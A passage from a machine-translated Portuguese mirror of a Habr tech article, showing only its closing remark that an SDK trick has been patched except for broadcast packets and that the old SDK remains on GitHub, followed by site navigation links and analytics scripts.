<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Então isso realmente funciona? </font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Não. </font><font style="vertical-align: inherit;">Nas versões atuais do SDK está </font></font><s><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">quebrado</font></font></s><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> pofiksili. </font><font style="vertical-align: inherit;">Pacotes de transmissão podem ser enviados, mas nada mais. </font><font style="vertical-align: inherit;">Mas o antigo SDK foi cuidadosamente preservado e disponível como parte do exemplo no </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">GitHub</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">Use com cuidado.</font></font></div>
      
    </div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/pt397741/">https://habr.com/ru/post/pt397741/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt397715/index.html">As primeiras estrelas do universo são invisíveis?</a></li>
<li><a href="../pt397725/index.html">O universo é apenas</a></li>
<li><a href="../pt397729/index.html">A NASA explica que a posição dos "signos do zodíaco" mudou há muito tempo. Pânico nas revistas femininas</a></li>
<li><a href="../pt397733/index.html">Monsanto лицензировала технологию генного редактирования CRISPR/Cas9</a></li>
<li><a href="../pt397735/index.html">Neurotransmissores, Parte Um: Dopamina, Norepinefrina, Serotonina</a></li>
<li><a href="../pt397743/index.html">Heróis do YouTube - um verdadeiro feriado para o "vigia"</a></li>
<li><a href="../pt397749/index.html">A estrutura e as configurações iniciais do cérebro</a></li>
<li><a href="../pt397751/index.html">Como fazer previsões científicas</a></li>
<li><a href="../pt397753/index.html">A China abriu os olhos celestiais. O maior radiotelescópio do mundo lançado hoje</a></li>
<li><a href="../pt397755/index.html">Vulcões submarinos - um oásis no fundo do mar</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>